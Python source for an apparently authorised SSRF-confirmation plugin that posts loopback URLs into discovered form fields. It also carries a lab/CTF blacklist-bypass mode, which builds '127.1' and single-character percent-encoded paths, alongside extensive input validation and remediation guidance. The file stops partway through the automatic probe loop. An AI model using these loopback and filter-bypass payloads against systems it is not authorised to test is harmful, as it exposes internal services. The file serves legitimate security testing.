"""Fail-closed loopback SSRF confirmation.

Automatic mode consumes only server-resolved, same-origin URL-form candidates
and owns its four bounded control/loopback requests. Legacy blacklist-bypass
mode remains available for one explicitly configured lab/CTF sink. Callers
cannot provide an internal URL, port, headers, cookies, credentials, alternate
scheme, OOB destination, or raw request body.
"""

from __future__ import annotations

import hashlib
import re
from html import unescape
from typing import Any, Dict, Iterable, List, Optional, Tuple
from urllib.parse import quote_plus, urlencode, urljoin, urlsplit

import aiohttp

from plugin_interface import ToolPlugin
from tools._agentic_exploration_common import read_limited
from tools.web_authentication_probe import (
    MAX_RESPONSE_BYTES,
    _field_name,
    _http_target,
    _path_and_query,
    _relative_path,
    sanitize_evidence_text,
)


AUTO_MODE = "auto-discovered-url-form-loopback"
LEGACY_MODE = "loopback-blacklist-form"
ALLOWED_MODES = {AUTO_MODE, LEGACY_MODE}
ALLOWED_ENGAGEMENTS = {"lab", "ctf"}
# #1648 — two-tier proof. The runtime tier proves the vulnerability from its own
# evidence and needs no PortSwigger status page; the lab tier brackets it with the
# unsolved -> solved transition for calibration. Before this, the transition was
# mandatory at BOTH layers, so a confirmed finding on a customer application was
# impossible by construction.
AUTO_PROOF_LEVEL = "runtime-loopback-differential"
ALLOWED_PROOF_LEVELS = {"runtime-filter-bypass", "lab-state-change"}
STATE_CHANGE_ENGAGEMENTS = {"lab", "ctf"}
_STATE_CHANGE_PARAMETERS = {
    "effectPath",
    "expectedBaselineStatus",
    "expectedEffectLocation",
    "expectedEffectStatus",
    "expectedSolvedStatus",
    "solvedMarker",
    "stateChangeApproved",
    "statusPath",
    "unsolvedMarker",
}
RUNTIME_EXPECTED_STEP_LABELS = (
    "direct-resource-denied",
    "literal-loopback-filtered",
    "encoded-loopback-internal-content",
)
LAB_EXPECTED_STEP_LABELS = (
    "unsolved-baseline",
    *RUNTIME_EXPECTED_STEP_LABELS,
    "approved-effect",
    "solved-confirmation",
)
EXPECTED_STEP_LABELS_BY_PROOF_LEVEL = {
    "runtime-filter-bypass": RUNTIME_EXPECTED_STEP_LABELS,
    "lab-state-change": LAB_EXPECTED_STEP_LABELS,
}
# Back-compat alias; equals the lab shape.
EXPECTED_STEP_LABELS = LAB_EXPECTED_STEP_LABELS
INTERNAL_SCHEME = "http"
LITERAL_LOOPBACK_HOST = "localhost"
BYPASS_LOOPBACK_HOST = "127.1"
MAX_ADDITIONAL_FIELDS = 7
MAX_FORM_VALUE_CHARS = 512
MAX_MARKER_CHARS = 512
MAX_BLOCKED_TOKEN_CHARS = 64
MAX_SSRF_EVIDENCE_CHARS = 65_000
MAX_AUTO_CANDIDATES = 6
MAX_AUTO_REQUESTS = MAX_AUTO_CANDIDATES * 4
AUTO_EXPECTED_STEP_LABELS = (
    "observed-url-control",
    "localhost-loopback-root",
    "ipv4-loopback-root",
    "ipv4-loopback-derived-path",
)

_SENSITIVE_FIELD = re.compile(
    r"(?:auth|csrf|token|session|cookie|pass(?:word|wd)?|secret|api[_-]?key)",
    re.I,
)
_FETCH_CONTROL_FIELD = re.compile(
    r"(?:url|uri|host|port|scheme|callback|webhook|redirect|destination|dest)",
    re.I,
)
_URI_OR_MARKUP = re.compile(r"(?:<|>|(?:[A-Za-z][A-Za-z0-9+.-]*):/{0,2})")
_SENSITIVE_VALUE = re.compile(
    r"(?:password|pass|passwd|csrf|token|session|cookie|authorization|secret|api[_-]?key)"
    r"[A-Za-z0-9_.-]*\s*=",
    re.I,
)
_BLOCKED_TOKEN = re.compile(r"^[A-Za-z0-9_-]{2,64}$")

_ALLOWED_PARAMETER_KEYS = {
    "target",
    "proofLevel",
    "url",
    "mode",
    "statusPath",
    "endpointPath",
    "internalPath",
    "effectPath",
    "injectionField",
    "additionalFields",
    "blockedPathToken",
    "unsolvedMarker",
    "solvedMarker",
    "deniedMarker",
    "filterMarker",
    "internalMarker",
    "expectedBaselineStatus",
    "expectedDeniedStatus",
    "expectedFilterStatus",
    "expectedInternalStatus",
    "expectedEffectStatus",
    "expectedSolvedStatus",
    "expectedEffectLocation",
    "engagement",
    "allowUnsafeMethods",
    "stateChangeApproved",
    "timeoutSeconds",
    "candidates",
    "maxCandidates",
    "maxRequests",
    "_agent",
    "_job_id",
    "_job_timeout_seconds",
}

_AUTO_CANDIDATE_KEYS = {
    "candidateId",
    "endpointUrl",
    "injectionField",
    "baselineValue",
    "additionalFields",
}
_AUTO_ONLY_PARAMETERS = {"candidates", "maxCandidates", "maxRequests"}
_LEGACY_ONLY_PARAMETERS = {
    "statusPath",
    "endpointPath",
    "internalPath",
    "effectPath",
    "injectionField",
    "additionalFields",
    "blockedPathToken",
    "unsolvedMarker",
    "solvedMarker",
    "deniedMarker",
    "filterMarker",
    "internalMarker",
    "expectedBaselineStatus",
    "expectedDeniedStatus",
    "expectedFilterStatus",
    "expectedInternalStatus",
    "expectedEffectStatus",
    "expectedSolvedStatus",
    "expectedEffectLocation",
    "stateChangeApproved",
}


def _credential_free_http_url(value: Any) -> Optional[str]:
    raw = str(value or "").strip()
    if not raw or len(raw) > 4096:
        return None
    try:
        parsed = urlsplit(raw)
        invalid = (
            parsed.scheme not in {"http", "https"}
            or not parsed.netloc
            or parsed.username
            or parsed.password
            or parsed.fragment
        )
        _ = parsed.port
    except ValueError:
        return None
    if invalid:
        return None
    return raw


def _same_origin(left: str, right: str) -> bool:
    try:
        left_url = urlsplit(left)
        right_url = urlsplit(right)
        return (
            left_url.scheme.lower(),
            left_url.hostname,
            left_url.port,
        ) == (
            right_url.scheme.lower(),
            right_url.hostname,
            right_url.port,
        )
    except ValueError:
        return False


def _validate_auto_parameters(
    parameters: Dict[str, Any],
    target: str,
) -> Tuple[bool, str]:
    if str(parameters.get("proofLevel") or "").lower() != AUTO_PROOF_LEVEL:
        return False, f"proofLevel must be {AUTO_PROOF_LEVEL} for {AUTO_MODE}"
    if str(parameters.get("engagement") or "").lower() != "standard":
        return False, f"engagement must be standard for {AUTO_MODE}"
    if parameters.get("allowUnsafeMethods") is not True:
        return False, "allowUnsafeMethods=true is required for bounded POST form probes"
    unexpected = sorted(_LEGACY_ONLY_PARAMETERS.intersection(parameters))
    if unexpected:
        return False, f"{unexpected[0]} is not accepted by {AUTO_MODE}"

    candidates = parameters.get("candidates")
    if not isinstance(candidates, list) or not candidates:
        return False, "candidates must contain at least one server-resolved form candidate"
    if len(candidates) > MAX_AUTO_CANDIDATES:
        return False, f"candidates must contain at most {MAX_AUTO_CANDIDATES} entries"
    try:
        max_candidates = int(parameters.get("maxCandidates"))
        max_requests = int(parameters.get("maxRequests"))
    except (TypeError, ValueError):
        return False, "maxCandidates and maxRequests must be integers"
    if max_candidates != len(candidates) or not 1 <= max_candidates <= MAX_AUTO_CANDIDATES:
        return False, "maxCandidates must exactly match the bounded candidate list"
    if max_requests != max_candidates * 4 or max_requests > MAX_AUTO_REQUESTS:
        return False, "maxRequests must reserve exactly four requests per candidate"

    for candidate in candidates:
        if not isinstance(candidate, dict) or set(candidate) != _AUTO_CANDIDATE_KEYS:
            return False, "each candidate must match the closed server-resolved SSRF contract"
        if re.fullmatch(r"cand-[a-f0-9]{16}", str(candidate.get("candidateId") or "")) is None:
            return False, "candidateId must be an opaque persisted candidate reference"
        endpoint = _credential_free_http_url(candidate.get("endpointUrl"))
        baseline = _credential_free_http_url(candidate.get("baselineValue"))
        if not endpoint or not baseline or not _same_origin(target, endpoint):
            return False, "candidate endpoint must be credential-free HTTP(S) and same-origin"
        injection_field = _field_name(candidate.get("injectionField"))
        if not injection_field or _SENSITIVE_FIELD.search(injection_field):
            return False, "candidate injectionField must be valid and non-sensitive"
        additional_fields = candidate.get("additionalFields")
        if not isinstance(additional_fields, dict) or len(additional_fields) > MAX_ADDITIONAL_FIELDS:
            return False, "candidate additionalFields must be a bounded object"
        for raw_name, raw_value in additional_fields.items():
            name = _field_name(raw_name)
            if (
                not name
                or name == injection_field
                or _SENSITIVE_FIELD.search(name)
                or _FETCH_CONTROL_FIELD.search(name)
                or _bounded_plain_value(raw_value) is None
            ):
                return False, "candidate additionalFields contain an unsafe field or value"

    try:
        timeout = int(parameters.get("timeoutSeconds") or 15)
    except (TypeError, ValueError):
        return False, "timeoutSeconds must be an integer"
    if timeout < 3 or timeout > 30:
        return False, "timeoutSeconds must be between 3 and 30"
    return True, ""


def response_contains_marker(body: str, marker: str) -> bool:
    return marker in body or marker in unescape(body)


def _bounded_plain_value(value: Any) -> Optional[str]:
    if not isinstance(value, str):
        return None
    if (
        len(value) > MAX_FORM_VALUE_CHARS
        or any(character in value for character in "\r\n\0")
        or _URI_OR_MARKUP.search(value)
        or _SENSITIVE_VALUE.search(value)
        or re.search(r"\bBearer\s+[A-Za-z0-9._~+/-]{3,}", value, re.I)
    ):
        return None
    return value


def _bounded_marker(value: Any) -> Optional[str]:
    marker = str(value or "")
    if (
        len(marker) < 3
        or len(marker) > MAX_MARKER_CHARS
        or any(character in marker for character in "\r\n\0")
    ):
        return None
    return marker


def _parse_status(
    parameters: Dict[str, Any],
    key: str,
    minimum: int = 200,
    maximum: int = 599,
) -> Tuple[Optional[int], str]:
    try:
        value = int(parameters[key])
    except (KeyError, TypeError, ValueError):
        return None, f"{key} must be an integer"
    if value < minimum or value > maximum:
        return None, f"{key} must be between {minimum} and {maximum}"
    return value, ""


def encode_blocked_path(path: str, blocked_token: str) -> str:
    """Encode one token character; form encoding supplies the second layer."""

    if path.count(blocked_token) != 1:
        raise ValueError("blockedPathToken must occur exactly once in the path")
    first_character = blocked_token[0]
    encoded_first = f"%{ord(first_character):02x}"
    return path.replace(
        blocked_token,
        f"{encoded_first}{blocked_token[1:]}",
        1,
    )


def build_internal_urls(
    internal_path: str,
    effect_path: str,
    blocked_token: str,
) -> Tuple[str, str, str]:
    encoded_internal_path = encode_blocked_path(internal_path, blocked_token)
    encoded_effect_path = encode_blocked_path(effect_path, blocked_token)
    return (
        f"{INTERNAL_SCHEME}://{LITERAL_LOOPBACK_HOST}{internal_path}",
        f"{INTERNAL_SCHEME}://{BYPASS_LOOPBACK_HOST}{encoded_internal_path}",
        f"{INTERNAL_SCHEME}://{BYPASS_LOOPBACK_HOST}{encoded_effect_path}",
    )


def build_form_body(
    injection_field: str,
    fetch_url: str,
    additional_fields: Dict[str, str],
) -> str:
    return urlencode({injection_field: fetch_url, **additional_fields})


def validate_probe_parameters(parameters: Dict[str, Any]) -> Tuple[bool, str]:
    unexpected = set(parameters) - _ALLOWED_PARAMETER_KEYS
    if unexpected:
        return False, "unsupported parameters are not accepted by the bounded SSRF mode"
    if bool(parameters.get("target")) == bool(parameters.get("url")):
        return False, "provide exactly one of target or url"
    target = _http_target(parameters.get("target") or parameters.get("url"))
    if not target:
        return False, "target must be a credential-free HTTP(S) base URL without query or fragment"
    mode = str(parameters.get("mode") or "").lower()
    if mode not in ALLOWED_MODES:
        return False, f"mode must be {AUTO_MODE} or {LEGACY_MODE}"
    if mode == AUTO_MODE:
        return _validate_auto_parameters(parameters, target)
    unexpected_auto = sorted(_AUTO_ONLY_PARAMETERS.intersection(parameters))
    if unexpected_auto:
        return False, f"{unexpected_auto[0]} is only accepted by {AUTO_MODE}"
    if str(parameters.get("engagement") or "").lower() not in ALLOWED_ENGAGEMENTS:
        return False, "engagement must be lab or ctf"
    if parameters.get("allowUnsafeMethods") is not True:
        return False, "allowUnsafeMethods=true is required"

    # #1648 — tier resolution. No defaulting: an unrecognised value is rejected so
    # a typo cannot silently downgrade or upgrade the assertions.
    proof_level = str(parameters.get("proofLevel") or "").lower()
    if proof_level not in ALLOWED_PROOF_LEVELS:
        return False, "proofLevel must be runtime-filter-bypass or lab-state-change"
    if proof_level == "lab-state-change":
        if str(parameters.get("engagement") or "").lower() not in STATE_CHANGE_ENGAGEMENTS:
            return False, "lab-state-change requires engagement lab or ctf"
    else:
        # The runtime tier must REJECT lab material rather than ignore it, or a
        # caller could believe a transition was proven when nothing checked it.
        unexpected = sorted(_STATE_CHANGE_PARAMETERS.intersection(parameters))
        if unexpected:
            return False, f"{unexpected[0]} is only allowed for proofLevel=lab-state-change"
    if parameters.get("stateChangeApproved") is not True:
        return False, "stateChangeApproved=true is required"

    paths: Dict[str, str] = {}
    for key in (
        "statusPath",
        "endpointPath",
        "internalPath",
        "effectPath",
        "expectedEffectLocation",
    ):
        path = _relative_path(parameters.get(key))
        if not path:
            return False, f"{key} must be a bounded same-origin relative path"
        paths[key] = path

    injection_field = _field_name(parameters.get("injectionField"))
    if not injection_field or _SENSITIVE_FIELD.search(injection_field):
        return False, "injectionField must be a valid non-sensitive form-field name"

    additional_fields = parameters.get("additionalFields")
    if not isinstance(additional_fields, dict):
        return False, "additionalFields must be an object with at most seven string fields"
    if len(additional_fields) > MAX_ADDITIONAL_FIELDS:
        return False, "additionalFields must contain at most seven fields"
    for raw_name, raw_value in additional_fields.items():
        name = _field_name(raw_name)
        if (
            not name
            or name == injection_field
            or _SENSITIVE_FIELD.search(name)
            or _FETCH_CONTROL_FIELD.search(name)
        ):
            return False, "additionalFields keys must be valid non-sensitive form-field names"
        if _bounded_plain_value(raw_value) is None:
            return False, (
                "additionalFields values must be bounded plain strings without URLs, "
                "markup, or control-line characters"
            )

    blocked_token = str(parameters.get("blockedPathToken") or "")
    if (
        len(blocked_token) > MAX_BLOCKED_TOKEN_CHARS
        or _BLOCKED_TOKEN.fullmatch(blocked_token) is None
    ):
        return False, "blockedPathToken must be a bounded ASCII path token"
    if (
        paths["internalPath"].count(blocked_token) != 1
        or paths["effectPath"].count(blocked_token) != 1
    ):
        return False, "blockedPathToken must occur exactly once in internalPath and effectPath"
    try:
        build_internal_urls(paths["internalPath"], paths["effectPath"], blocked_token)
    except ValueError as exc:
        return False, str(exc)

    markers = {
        key: _bounded_marker(parameters.get(key))
        for key in (
            "unsolvedMarker",
            "solvedMarker",
            "deniedMarker",
            "filterMarker",
            "internalMarker",
        )
    }
    if any(marker is None for marker in markers.values()):
        return False, f"all proof markers must contain 3 to {MAX_MARKER_CHARS} safe characters"
    if len(set(markers.values())) != len(markers):
        return False, "all proof markers must be distinct"

    status_bounds = {
        "expectedBaselineStatus": (200, 599),
        "expectedDeniedStatus": (200, 599),
        "expectedFilterStatus": (200, 599),
        "expectedInternalStatus": (200, 599),
        "expectedEffectStatus": (300, 399),
        "expectedSolvedStatus": (200, 599),
    }
    for key, (minimum, maximum) in status_bounds.items():
        status, reason = _parse_status(parameters, key, minimum, maximum)
        if status is None:
            return False, reason

    try:
        timeout = int(parameters.get("timeoutSeconds") or 15)
    except (TypeError, ValueError):
        return False, "timeoutSeconds must be an integer"
    if timeout < 3 or timeout > 30:
        return False, "timeoutSeconds must be between 3 and 30"
    return True, ""


def _request_transcript(
    method: str,
    url: str,
    body: str = "",
    secret_values: Iterable[Any] = (),
) -> str:
    parsed = urlsplit(url)
    lines = [
        f"{method} {_path_and_query(url)} HTTP/1.1",
        f"Host: {parsed.netloc}",
        "User-Agent: xASM-Agentic-SSRF-Probe/1.0",
        "Accept: text/html,application/xhtml+xml,text/plain",
    ]
    if method == "POST":
        lines.extend(
            [
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {len(body.encode('utf-8'))}",
            ]
        )
    return sanitize_evidence_text(
        "\r\n".join(lines) + "\r\n\r\n" + body,
        secret_values,
        MAX_SSRF_EVIDENCE_CHARS,
    )


def _response_transcript(
    response: Dict[str, Any],
    secret_values: Iterable[Any] = (),
) -> Tuple[str, bool]:
    reason = str(response.get("reason") or "").replace("\r", "").replace("\n", "")[:100]
    lines = [f"HTTP/1.1 {int(response.get('status') or 0)} {reason}"]
    included_headers = {"content-type", "content-length", "cache-control", "location"}
    for name, value in response.get("headers", {}).items():
        if str(name).lower() in included_headers:
            lines.append(f"{name}: {value}")
    raw = "\r\n".join(lines) + "\r\n\r\n" + str(response.get("body") or "")
    sanitized = sanitize_evidence_text(
        raw,
        secret_values,
        MAX_SSRF_EVIDENCE_CHARS,
    )
    oversized = len(raw) > MAX_SSRF_EVIDENCE_CHARS or len(sanitized) > MAX_SSRF_EVIDENCE_CHARS
    return sanitized, bool(response.get("truncated")) or oversized


def build_http_evidence_step(
    label: str,
    method: str,
    url: str,
    body: str,
    response: Dict[str, Any],
    secret_values: Iterable[Any] = (),
) -> Dict[str, Any]:
    request = _request_transcript(method, url, body, secret_values)
    response_text, truncated = _response_transcript(response, secret_values)
    response_body = response_text.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in response_text else ""
    return {
        "label": label,
        "request": request,
        "requestSha256": hashlib.sha256(request.encode("utf-8")).hexdigest(),
        "wireRequestBodySha256": hashlib.sha256(body.encode("utf-8")).hexdigest(),
        "response": response_text,
        "responseSha256": hashlib.sha256(response_text.encode("utf-8")).hexdigest(),
        "responseBodySha256": hashlib.sha256(response_body.encode("utf-8")).hexdigest(),
        "responseStatus": int(response.get("status") or 0),
        "responseBodyLength": len(response_body.encode("utf-8")),
        "responseExcerptTruncated": truncated,
    }


def build_nuclei_finding(target: str, verification: Dict[str, Any]) -> Dict[str, Any]:
    automatic = verification.get("mode") == AUTO_MODE
    return {
        "template-id": (
            "xasm-ssrf-discovered-url-form-loopback-verified"
            if automatic
            else "xasm-ssrf-loopback-blacklist-bypass-verified"
        ),
        "matcher-name": AUTO_MODE if automatic else LEGACY_MODE,
        "type": "http",
        "host": target,
        "matched-at": str(verification.get("endpointUrl") or target),
        "info": {
            "name": (
                "Verified SSRF via Discovered URL Form"
                if automatic
                else "Verified SSRF via Loopback Blacklist Bypass"
            ),
            "severity": "high",
            "description": (
                "A discovered URL-valued form field caused the server to return matching "
                "loopback-only content for both localhost and 127.0.0.1, with a clean "
                "observed-URL control and a consistently derived internal path."
                if automatic
                else "A server-side URL fetch reached a loopback-only resource after a fixed "
                "loopback-alias and double-encoding blacklist bypass."
            ),
            "remediation": (
                "Resolve and canonicalize destinations before fetching, allowlist required "
                "origins, reject loopback/private/link-local addresses after every DNS "
                "resolution and redirect, and isolate fetch workers from internal services."
            ),
            "classification": {"cwe-id": ["CWE-918"]},
        },
        "evidence": verification,
    }


_PATH_ATTRIBUTE_RE = re.compile(
    r"(?:href|action|src)\s*=\s*['\"]([^'\"]+)['\"]",
    re.I,
)
_ABSOLUTE_LOOPBACK_PATH_RE = re.compile(
    r"https?://(?:localhost|127(?:\.\d{1,3}){3})(/[^\s'\"<>]*)?",
    re.I,
)
_MUTATING_PATH_RE = re.compile(
    r"/(?:delete|remove|destroy|logout|signout|reset|update|create|submit|execute)(?:/|$)",
    re.I,
)
_STATIC_PATH_RE = re.compile(
    r"\.(?:css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|map)(?:$|\?)",
    re.I,
)


def _safe_derived_path(value: str) -> Optional[str]:
    raw = unescape(str(value or "")).strip()
    if not raw:
        return None
    parsed = urlsplit(raw)
    if parsed.scheme or parsed.netloc:
        if parsed.hostname not in {"localhost", "127.0.0.1"}:
            return None
        raw = parsed.path or "/"
    else:
        raw = raw.split("#", 1)[0].split("?", 1)[0]
    if (
        not raw.startswith("/")
        or raw.startswith("//")
        or raw == "/"
        or len(raw) > 256
        or ".." in raw
        or any(character in raw for character in "\r\n\0")
        or _MUTATING_PATH_RE.search(raw)
        or _STATIC_PATH_RE.search(raw)
    ):
        return None
    return raw.rstrip("/") or None


def _relative_paths(body: str) -> set[str]:
    paths: set[str] = set()
    decoded = unescape(str(body or ""))
    values = _PATH_ATTRIBUTE_RE.findall(decoded)
    values.extend(match.group(0) for match in _ABSOLUTE_LOOPBACK_PATH_RE.finditer(decoded))
    for value in values[:200]:
        path = _safe_derived_path(value)
        raw_path = urlsplit(unescape(str(value or ""))).path
        segments = [segment for segment in (path or raw_path).split("/") if segment]
        if path:
            paths.add(path)
        for size in range(1, len(segments)):
            parent = "/" + "/".join(segments[:size])
            if _safe_derived_path(parent):
                paths.add(parent)
    return set(sorted(paths)[:80])


def _structural_profile(response: Dict[str, Any], submitted_url: str) -> Dict[str, Any]:
    body = unescape(str(response.get("body") or ""))
    for value in {submitted_url, quote_plus(submitted_url)}:
        if value:
            body = body.replace(value, " ")
    tags = re.findall(r"<\s*([a-z][a-z0-9:-]{0,40})(?:\s|/?>)", body, re.I)[:400]
    text = re.sub(r"<[^>]{0,2000}>", " ", body)
    tokens = {
        token.lower()
        for token in re.findall(r"[A-Za-z0-9_-]{3,64}", text)[:1000]
        if token.lower() not in {"http", "https", "localhost", "127", "0", "1"}
    }
    headers = response.get("headers") or {}
    content_type = str(headers.get("Content-Type") or headers.get("content-type") or "")
    content_family = content_type.split(";", 1)[0].strip().lower()
    paths = _relative_paths(body)
    fingerprint_material = "|".join(
        [
            content_family,
            ",".join(sorted(set(tag.lower() for tag in tags))),
            ",".join(sorted(paths)),
            ",".join(sorted(tokens)[:120]),
        ]
    )
    return {
        "status": int(response.get("status") or 0),
        "contentFamily": content_family,
        "tags": set(tag.lower() for tag in tags),
        "paths": paths,
        "tokens": tokens,
        "fingerprint": hashlib.sha256(fingerprint_material.encode("utf-8")).hexdigest(),
    }


def _jaccard(left: set[str], right: set[str]) -> float:
    union = left | right
    if not union:
        return 1.0
    return len(left & right) / len(union)


def _nontrivial_profile(profile: Dict[str, Any]) -> bool:
    return (
        len(profile["tokens"]) >= 8
        or len(profile["tags"]) >= 3
        or (len(profile["tokens"]) >= 4 and bool(profile["paths"]))
    )


def _alias_similarity(left: Dict[str, Any], right: Dict[str, Any]) -> float:
    components = [
        1.0 if left["contentFamily"] == right["contentFamily"] else 0.0,
        _jaccard(left["tags"], right["tags"]),
        _jaccard(left["paths"], right["paths"]),
        _jaccard(left["tokens"], right["tokens"]),
    ]
    return round(sum(components) / len(components), 4)


def _clean_differential(control: Dict[str, Any], loopback: Dict[str, Any]) -> bool:
    return bool(
        control["status"] != loopback["status"]
        or control["contentFamily"] != loopback["contentFamily"]
        or control["paths"] != loopback["paths"]
        or _jaccard(control["tokens"], loopback["tokens"]) < 0.8
        or _jaccard(control["tags"], loopback["tags"]) < 0.8
    )


def _derive_common_path(left: Dict[str, Any], right: Dict[str, Any]) -> Optional[str]:
    common = left["paths"] & right["paths"]
    if not common:
        return None
    return sorted(common, key=lambda path: (path.count("/"), len(path), path))[0]


class SsrfProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:ssrf_probe"

    @property
    def description(self) -> str:
        return (
            "Confirms bounded in-band loopback SSRF from a server-resolved discovered URL form "
            "or replays the explicit blacklist-bypass calibration contract."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        marker_schema = {"type": "string", "minLength": 3, "maxLength": MAX_MARKER_CHARS}
        status_schema = {"type": "integer", "minimum": 200, "maximum": 599}
        return {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Authorized application base URL"},
                "url": {"type": "string", "description": "Alias for target"},
                "mode": {"type": "string", "enum": sorted(ALLOWED_MODES)},
                "proofLevel": {
                    "type": "string",
                    "enum": sorted({*ALLOWED_PROOF_LEVELS, AUTO_PROOF_LEVEL}),
                },
                "statusPath": {"type": "string"},
                "endpointPath": {"type": "string"},
                "internalPath": {"type": "string"},
                "effectPath": {"type": "string"},
                "injectionField": {"type": "string"},
                "additionalFields": {
                    "type": "object",
                    "maxProperties": MAX_ADDITIONAL_FIELDS,
                    "additionalProperties": {
                        "type": "string",
                        "maxLength": MAX_FORM_VALUE_CHARS,
                    },
                },
                "blockedPathToken": {
                    "type": "string",
                    "minLength": 2,
                    "maxLength": MAX_BLOCKED_TOKEN_CHARS,
                },
                "unsolvedMarker": marker_schema,
                "solvedMarker": marker_schema,
                "deniedMarker": marker_schema,
                "filterMarker": marker_schema,
                "internalMarker": marker_schema,
                "expectedBaselineStatus": status_schema,
                "expectedDeniedStatus": status_schema,
                "expectedFilterStatus": status_schema,
                "expectedInternalStatus": status_schema,
                "expectedEffectStatus": {"type": "integer", "minimum": 300, "maximum": 399},
                "expectedSolvedStatus": status_schema,
                "expectedEffectLocation": {"type": "string"},
                "engagement": {
                    "type": "string",
                    "enum": ["standard", "aggressive", *sorted(ALLOWED_ENGAGEMENTS)],
                },
                "allowUnsafeMethods": {"type": "boolean", "default": False},
                "stateChangeApproved": {"type": "boolean", "default": False},
                "timeoutSeconds": {"type": "integer", "minimum": 3, "maximum": 30},
                "candidates": {
                    "type": "array",
                    "minItems": 1,
                    "maxItems": MAX_AUTO_CANDIDATES,
                    "items": {
                        "type": "object",
                        "properties": {
                            "candidateId": {
                                "type": "string",
                                "pattern": "^cand-[a-f0-9]{16}$",
                            },
                            "endpointUrl": {"type": "string", "maxLength": 4096},
                            "injectionField": {"type": "string", "maxLength": 80},
                            "baselineValue": {"type": "string", "maxLength": 4096},
                            "additionalFields": {
                                "type": "object",
                                "maxProperties": MAX_ADDITIONAL_FIELDS,
                                "additionalProperties": {
                                    "type": "string",
                                    "maxLength": MAX_FORM_VALUE_CHARS,
                                },
                            },
                        },
                        "required": sorted(_AUTO_CANDIDATE_KEYS),
                        "additionalProperties": False,
                    },
                },
                "maxCandidates": {
                    "type": "integer",
                    "minimum": 1,
                    "maximum": MAX_AUTO_CANDIDATES,
                },
                "maxRequests": {
                    "type": "integer",
                    "minimum": 4,
                    "maximum": MAX_AUTO_REQUESTS,
                },
            },
            "required": [
                "mode",
                "proofLevel",
                "engagement",
                "allowUnsafeMethods",
            ],
            "allOf": [
                {
                    "if": {"properties": {"mode": {"const": AUTO_MODE}}},
                    "then": {
                        "required": ["candidates", "maxCandidates", "maxRequests"],
                        "not": {
                            "anyOf": [
                                {"required": [field]}
                                for field in sorted(_LEGACY_ONLY_PARAMETERS)
                            ]
                        },
                    },
                    "else": {
                        "required": [
                            "endpointPath",
                            "internalPath",
                            "injectionField",
                            "additionalFields",
                            "blockedPathToken",
                            "deniedMarker",
                            "filterMarker",
                            "internalMarker",
                            "expectedDeniedStatus",
                            "expectedFilterStatus",
                            "expectedInternalStatus",
                        ],
                        "not": {
                            "anyOf": [
                                {"required": [field]}
                                for field in sorted(_AUTO_ONLY_PARAMETERS)
                            ]
                        },
                    },
                },
                {
                    "if": {"properties": {"proofLevel": {"const": "lab-state-change"}}},
                    "then": {"required": sorted(_STATE_CHANGE_PARAMETERS)},
                    "else": {
                        "not": {
                            "anyOf": [
                                {"required": [field]}
                                for field in sorted(_STATE_CHANGE_PARAMETERS)
                            ]
                        }
                    },
                }
            ],

            "oneOf": [{"required": ["target"]}, {"required": ["url"]}],
            "additionalProperties": False,
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 4,
            "domain": ["web"],
            "input_type": ["url", "form", "workflow"],
            "output_type": ["findings", "ssrf_proof"],
            "taxonomy_domain": ["web"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Confirm one bounded loopback SSRF primitive",
            "secondary_purposes": [],
        }

    async def _request(
        self,
        session: aiohttp.ClientSession,
        method: str,
        url: str,
        body: Optional[str] = None,
    ) -> Dict[str, Any]:
        headers = {
            "User-Agent": "xASM-Agentic-SSRF-Probe/1.0",
            "Accept": "text/html,application/xhtml+xml,text/plain",
        }
        if method == "POST":
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        async with session.request(
            method,
            url,
            headers=headers,
            data=body if method == "POST" else None,
            allow_redirects=False,
        ) as response:
            raw = await read_limited(response.content, MAX_RESPONSE_BYTES + 1)
            truncated = len(raw) > MAX_RESPONSE_BYTES
            raw = raw[:MAX_RESPONSE_BYTES]
            return {
                "status": response.status,
                "reason": str(response.reason or "")[:100],
                "headers": response.headers,
                "body": raw.decode("utf-8", errors="replace").replace("\0", ""),
                "truncated": truncated,
            }

    @staticmethod
    def _response_is_bounded(response: Dict[str, Any]) -> bool:
        response_text, evidence_truncated = _response_transcript(response)
        return (
            not response.get("truncated")
            and not evidence_truncated
            and len(str(response.get("body") or "").encode("utf-8")) <= MAX_RESPONSE_BYTES
            and len(response_text) <= MAX_SSRF_EVIDENCE_CHARS
        )

    async def _execute_auto(self, parameters: Dict[str, Any], target: str) -> Dict[str, Any]:
        candidates = list(parameters["candidates"])
        max_requests = int(parameters["maxRequests"])
        timeout = int(parameters.get("timeoutSeconds") or 15)
        sweep_requests = 0
        candidate_outcomes: List[Dict[str, Any]] = []
        firing: Optional[Dict[str, Any]] = None
        firing_steps: List[Dict[str, Any]] = []
        firing_profiles: Dict[str, Any] = {}

        timeout_config = aiohttp.ClientTimeout(total=timeout, connect=min(timeout, 8))
        async with aiohttp.ClientSession(
            timeout=timeout_config,
            cookie_jar=aiohttp.DummyCookieJar(),
        ) as session:
            for candidate in candidates:
                candidate_id = str(candidate["candidateId"])
                endpoint_url = str(candidate["endpointUrl"])
                injection_field = str(candidate["injectionField"])
                baseline_value = str(candidate["baselineValue"])
                additional_fields = {
                    str(key): str(value)
                    for key, value in dict(candidate["additionalFields"]).items()
                }
                outcome = {
                    "candidateId": candidate_id,
                    "endpointUrl": endpoint_url,
                    "injectionField": injection_field,
                    "confirmed": False,
                    "requestCount": 0,
                }
                if sweep_requests + 4 > max_requests:
                    outcome["reason"] = "bounded request budget exhausted before candidate"
                    candidate_outcomes.append(outcome)
                    break

                control_url = baseline_value
                localhost_url = "http://localhost/"
                ipv4_url = "http://127.0.0.1/"
                control_body = build_form_body(
                    injection_field,
                    control_url,
                    additional_fields,
                )
                localhost_body = build_form_body(
                    injection_field,
                    localhost_url,
                    additional_fields,
                )
                ipv4_body = build_form_body(
                    injection_field,
                    ipv4_url,
                    additional_fields,
                )
                try:
                    control = await self._request(session, "POST", endpoint_url, control_body)
                    sweep_requests += 1
                    outcome["requestCount"] = 1
                    localhost = await self._request(
                        session,
                        "POST",
                        endpoint_url,
                        localhost_body,
                    )
                    sweep_requests += 1
                    outcome["requestCount"] = 2
